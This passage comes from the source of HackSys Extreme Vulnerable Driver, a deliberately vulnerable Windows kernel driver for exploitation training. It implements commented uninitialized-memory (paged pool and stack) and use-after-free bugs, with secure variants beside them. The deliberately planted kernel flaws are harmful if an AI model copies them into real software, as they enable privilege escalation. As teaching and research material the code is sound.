#pragma alloc_text(PAGE, UninitializedMemoryPagedPoolIoctlHandler)
#pragma alloc_text(PAGE, UninitializedMemoryPagedPoolObjectCallback)
#endif // ALLOC_PRAGMA


/// <summary>
/// Uninitialized Memory PagedPool Object Callback
/// </summary>
VOID
UninitializedMemoryPagedPoolObjectCallback(
    VOID
)
{
    PAGED_CODE();

    DbgPrint("[+] Uninitialized Memory PagedPool Object Callback\n");
}


/// <summary>
/// Trigger the uninitialized memory in PagedPool Vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerUninitializedMemoryPagedPool(
    _In_ PVOID UserBuffer
)
{
    ULONG_PTR UserValue = 0;
    ULONG_PTR MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
    PUNINITIALIZED_MEMORY_POOL UninitializedMemory = NULL;

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(UNINITIALIZED_MEMORY_POOL), (ULONG)__alignof(UCHAR));

        //
        // Allocate Pool chunk
        //

        UninitializedMemory = (PUNINITIALIZED_MEMORY_POOL)ExAllocatePoolWithTag(
            PagedPool,
            sizeof(UNINITIALIZED_MEMORY_POOL),
            (ULONG)POOL_TAG
        );

        if (!UninitializedMemory)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(PagedPool));
            DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(UNINITIALIZED_MEMORY_POOL));
            DbgPrint("[+] Pool Chunk: 0x%p\n", UninitializedMemory);
        }

        //
        // Get the value from user mode
        //

        UserValue = *(PULONG_PTR)UserBuffer;

        DbgPrint("[+] UserValue: 0x%p\n", UserValue);
        DbgPrint("[+] UninitializedMemory Address: 0x%p\n", &UninitializedMemory);

        //
        // Validate the magic value
        //

        if (UserValue == MagicValue) {
            UninitializedMemory->Value = UserValue;
            UninitializedMemory->Callback = &UninitializedMemoryPagedPoolObjectCallback;

            //
            // Fill the buffer with ASCII 'A'
            //

            RtlFillMemory(
                (PVOID)UninitializedMemory->Buffer,
                sizeof(UninitializedMemory->Buffer),
                0x41
            );

            //
            // Null terminate the char buffer
            //

            UninitializedMemory->Buffer[(sizeof(UninitializedMemory->Buffer) / sizeof(ULONG_PTR)) - 1] = '\0';
        }
#ifdef SECURE
        else {
            DbgPrint("[+] Freeing UninitializedMemory Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", UninitializedMemory);

            //
            // Free the allocated Pool chunk
            //

            ExFreePoolWithTag((PVOID)UninitializedMemory, (ULONG)POOL_TAG);

            //
            // Secure Note: This is secure because the developer is setting 'UninitializedMemory'
            // to NULL and checks for NULL pointer before calling the callback
            //

            //
            // Set to NULL to avoid dangling pointer
            //

            UninitializedMemory = NULL;
        }
#else
        //
        // Vulnerability Note: This is a vanilla Uninitialized Heap Variable vulnerability
        // because the developer is not setting 'Value' & 'Callback' to definite known value
        // before calling the 'Callback'
        //

        DbgPrint("[+] Triggering Uninitialized Memory in PagedPool\n");
#endif

        //
        // Call the callback function
        //

        if (UninitializedMemory)
        {
            DbgPrint("[+] UninitializedMemory->Value: 0x%p\n", UninitializedMemory->Value);
            DbgPrint("[+] UninitializedMemory->Callback: 0x%p\n", UninitializedMemory->Callback);

            UninitializedMemory->Callback();
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Uninitialized Memory PagedPool Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
UninitializedMemoryPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserBuffer)
    {
        Status = TriggerUninitializedMemoryPagedPool(UserBuffer);
    }

    return Status;
}

```

`Driver/HEVD/Windows/UninitializedMemoryPagedPool.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedMemoryPagedPool.h

Abstract:
    This module implements the data structures for
    uninitialized memory in PagedPool module.

--*/

#pragma once

#ifndef __UNINITIALIZED_MEMORY_PAGED_POOL_H__
#define __UNINITIALIZED_MEMORY_PAGED_POOL_H__

#include "Common.h"


//
// Structures
//

typedef struct _UNINITIALIZED_MEMORY_POOL
{
    ULONG_PTR Value;
    FunctionPointer Callback;
    ULONG_PTR Buffer[58];
} UNINITIALIZED_MEMORY_POOL, *PUNINITIALIZED_MEMORY_POOL;


//
// Function Definitions
//

VOID
UninitializedMemoryPagedPoolObjectCallback(
    VOID
);

NTSTATUS
TriggerUninitializedMemoryPagedPool(
    _In_ PVOID UserBuffer
);

#endif  // !__UNINITIALIZED_MEMORY_PAGED_POOL_H__

```

`Driver/HEVD/Windows/UninitializedMemoryStack.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedMemoryStack.c

Abstract:
    This module implements the functions to demonstrate
    use of uninitialized memory in Stack vulnerability.

--*/

#include "UninitializedMemoryStack.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, TriggerUninitializedMemoryStack)
#pragma alloc_text(PAGE, UninitializedMemoryStackIoctlHandler)
#pragma alloc_text(PAGE, UninitializedMemoryStackObjectCallback)
#endif // ALLOC_PRAGMA


/// <summary>
/// Uninitialized Memory Stack Object Callback
/// </summary>
VOID
UninitializedMemoryStackObjectCallback(
    VOID
)
{
    PAGED_CODE();

    DbgPrint("[+] Uninitialized Memory Stack Object Callback\n");
}


/// <summary>
/// Trigger the uninitialized memory in Stack Vulnerability
/// </summary>
/// <param name="UserBuffer">The pointer to user mode buffer</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
TriggerUninitializedMemoryStack(
    _In_ PVOID UserBuffer
)
{
    ULONG UserValue = 0;
    ULONG MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;

#ifdef SECURE
    //
    // Secure Note: This is secure because the developer is properly initializing
    // UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling
    // the callback
    //

    UNINITIALIZED_MEMORY_STACK UninitializedMemory = { 0 };
#else
    //
    // Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability
    // because the developer is not initializing 'UNINITIALIZED_MEMORY_STACK' structure
    // before calling the callback when 'MagicValue' does not match 'UserValue'
    //

    UNINITIALIZED_MEMORY_STACK UninitializedMemory;
#endif

    PAGED_CODE();

    __try
    {
        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(UserBuffer, sizeof(UNINITIALIZED_MEMORY_STACK), (ULONG)__alignof(UCHAR));

        //
        // Get the value from user mode
        //

        UserValue = *(PULONG)UserBuffer;

        DbgPrint("[+] UserValue: 0x%p\n", UserValue);
        DbgPrint("[+] UninitializedMemory Address: 0x%p\n", &UninitializedMemory);

        //
        // Validate the magic value
        //

        if (UserValue == MagicValue) {
            UninitializedMemory.Value = UserValue;
            UninitializedMemory.Callback = &UninitializedMemoryStackObjectCallback;
        }

        DbgPrint("[+] UninitializedMemory.Value: 0x%p\n", UninitializedMemory.Value);
        DbgPrint("[+] UninitializedMemory.Callback: 0x%p\n", UninitializedMemory.Callback);

#ifndef SECURE
        DbgPrint("[+] Triggering Uninitialized Memory in Stack\n");
#endif

        //
        // Call the callback function
        //

        if (UninitializedMemory.Callback)
        {
            UninitializedMemory.Callback();
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Uninitialized Memory Stack Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
UninitializedMemoryStackIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserBuffer)
    {
        Status = TriggerUninitializedMemoryStack(UserBuffer);
    }

    return Status;
}

```

`Driver/HEVD/Windows/UninitializedMemoryStack.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UninitializedMemoryStack.h

Abstract:
    This module implements the data structures for
    uninitialized memory in Stack module.

--*/

#pragma once

#ifndef __UNINITIALIZED_MEMORY_STACK_H__
#define __UNINITIALIZED_MEMORY_STACK_H__

#include "Common.h"


//
// Structures
//

typedef struct _UNINITIALIZED_MEMORY_STACK
{
    ULONG Value;
    FunctionPointer Callback;
    ULONG Buffer[58];
} UNINITIALIZED_MEMORY_STACK, *PUNINITIALIZED_MEMORY_STACK;


//
// Function Definitions
//

VOID
UninitializedMemoryStackObjectCallback(
    VOID
);

NTSTATUS
TriggerUninitializedMemoryStack(
    _In_ PVOID UserBuffer
);

#endif  // !__UNINITIALIZED_MEMORY_STACK_H__

```

`Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    UseAfterFreeNonPagedPool.c

Abstract:
    This module implements the functions to demonstrate
    Use After Free in NonPagedPool vulnerability.

--*/

#include "UseAfterFreeNonPagedPool.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, UseUaFObjectNonPagedPool)
#pragma alloc_text(PAGE, FreeUaFObjectNonPagedPool)
#pragma alloc_text(PAGE, AllocateUaFObjectNonPagedPool)
#pragma alloc_text(PAGE, UaFObjectCallbackNonPagedPool)
#pragma alloc_text(PAGE, AllocateFakeObjectNonPagedPool)
#pragma alloc_text(PAGE, UseUaFObjectNonPagedPoolIoctlHandler)
#pragma alloc_text(PAGE, FreeUaFObjectNonPagedPoolIoctlHandler)
#pragma alloc_text(PAGE, AllocateUaFObjectNonPagedPoolIoctlHandler)
#pragma alloc_text(PAGE, AllocateFakeObjectNonPagedPoolIoctlHandler)
#endif // ALLOC_PRAGMA


PUSE_AFTER_FREE_NON_PAGED_POOL g_UseAfterFreeObjectNonPagedPool = NULL;


/// <summary>
/// Use After Free Object Callback NonPagedPool
/// </summary>
VOID
UaFObjectCallbackNonPagedPool(
    VOID
)
{
    PAGED_CODE();

    DbgPrint("[+] UseAfter Free Object Callback NonPagedPool\n");
}


/// <summary>
/// Allocate the UaF object in NonPagedPool
/// </summary>
/// <returns>NTSTATUS</returns>
NTSTATUS
AllocateUaFObjectNonPagedPool(
    VOID
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = NULL;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Allocating UaF Object\n");

        //
        // Allocate Pool chunk
        //

        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag(
            NonPagedPool,
            sizeof(USE_AFTER_FREE_NON_PAGED_POOL),
            (ULONG)POOL_TAG
        );

        if (!UseAfterFree)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(USE_AFTER_FREE_NON_PAGED_POOL));
            DbgPrint("[+] Pool Chunk: 0x%p\n", UseAfterFree);
        }

        //
        // Fill the buffer with ASCII 'A'
        //

        RtlFillMemory((PVOID)UseAfterFree->Buffer, sizeof(UseAfterFree->Buffer), 0x41);

        //
        // Null terminate the char buffer
        //

        UseAfterFree->Buffer[sizeof(UseAfterFree->Buffer) - 1] = '\0';

        //
        // Set the object Callback function
        //

        UseAfterFree->Callback = &UaFObjectCallbackNonPagedPool;

        //
        // Assign the address of UseAfterFree to a global variable
        //

        g_UseAfterFreeObjectNonPagedPool = UseAfterFree;

        DbgPrint("[+] UseAfterFree Object: 0x%p\n", UseAfterFree);
        DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
        DbgPrint("[+] UseAfterFree->Callback: 0x%p\n", UseAfterFree->Callback);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Use the UaF object NonPagedPool
/// </summary>
/// <returns>NTSTATUS</returns>
NTSTATUS
UseUaFObjectNonPagedPool(
    VOID
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PAGED_CODE();

    __try
    {
        if (g_UseAfterFreeObjectNonPagedPool)
        {
            DbgPrint("[+] Using UaF Object\n");
            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool->Callback: 0x%p\n", g_UseAfterFreeObjectNonPagedPool->Callback);
            DbgPrint("[+] Calling Callback\n");

            if (g_UseAfterFreeObjectNonPagedPool->Callback)
            {
                g_UseAfterFreeObjectNonPagedPool->Callback();
            }

            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Free the UaF object NonPagedPool
/// </summary>
/// <returns>NTSTATUS</returns>
NTSTATUS
FreeUaFObjectNonPagedPool(
    VOID
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    PAGED_CODE();

    __try
    {
        if (g_UseAfterFreeObjectNonPagedPool)
        {
            DbgPrint("[+] Freeing UaF Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);

#ifdef SECURE
            //
            // Secure Note: This is secure because the developer is setting
            // 'g_UseAfterFreeObjectNonPagedPool' to NULL once the Pool chunk is being freed
            //

            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);

            //
            // Set to NULL to avoid dangling pointer
            //

            g_UseAfterFreeObjectNonPagedPool = NULL;
#else
            //
            // Vulnerability Note: This is a vanilla Use After Free vulnerability
            // because the developer is not setting 'g_UseAfterFreeObjectNonPagedPool' to NULL.
            // Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer
            // (dangling pointer)
            //

            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
#endif

            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Allocate the Fake object NonPagedPool
/// </summary>
/// <param name="UserFakeObject">The pointer to FAKE_OBJECT_NON_PAGED_POOL structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
AllocateFakeObjectNonPagedPool(
    _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PFAKE_OBJECT_NON_PAGED_POOL KernelFakeObject = NULL;

    PAGED_CODE();

    __try
    {
        DbgPrint("[+] Creating Fake Object\n");

        //
        // Allocate Pool chunk
        //

        KernelFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)ExAllocatePoolWithTag(
            NonPagedPool,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL),
            (ULONG)POOL_TAG
        );

        if (!KernelFakeObject)
        {
            //
            // Unable to allocate Pool chunk
            //

            DbgPrint("[-] Unable to allocate Pool chunk\n");

            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else
        {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(FAKE_OBJECT_NON_PAGED_POOL));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelFakeObject);
        }

        //
        // Verify if the buffer resides in user mode
        //

        ProbeForRead(
            (PVOID)UserFakeObject,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL),
            (ULONG)__alignof(UCHAR)
        );

        //
        // Copy the Fake structure to Pool chunk
        //

        RtlCopyMemory(
            (PVOID)KernelFakeObject,
            (PVOID)UserFakeObject,
            sizeof(FAKE_OBJECT_NON_PAGED_POOL)
        );

        //
        // Null terminate the char buffer
        //

        KernelFakeObject->Buffer[sizeof(KernelFakeObject->Buffer) - 1] = '\0';

        DbgPrint("[+] Fake Object: 0x%p\n", KernelFakeObject);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}


/// <summary>
/// Allocate UaF Object NonPagedPool Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP.</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
AllocateUaFObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(IrpSp);
    PAGED_CODE();

    Status = AllocateUaFObjectNonPagedPool();

    return Status;
}


/// <summary>
/// Use UaF Object NonPagedPool Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
UseUaFObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(IrpSp);
    PAGED_CODE();

    Status = UseUaFObjectNonPagedPool();

    return Status;
}


/// <summary>
/// Free UaF Object NonPagedPool Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
FreeUaFObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(IrpSp);
    PAGED_CODE();

    Status = FreeUaFObjectNonPagedPool();

    return Status;
}


/// <summary>
/// Allocate Fake Object NonPagedPool Ioctl Handler
/// </summary>
/// <param name="Irp">The pointer to IRP</param>
/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
/// <returns>NTSTATUS</returns>
NTSTATUS
AllocateFakeObjectNonPagedPoolIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject = NULL;

    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();

    UserFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;

    if (UserFakeObject)
    {
        Status = AllocateFakeObjectNonPagedPool(UserFakeObject);
    }

    return Status;
}

```

`Driver/HEVD/Windows/UseAfterFreeNonPagedPool.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
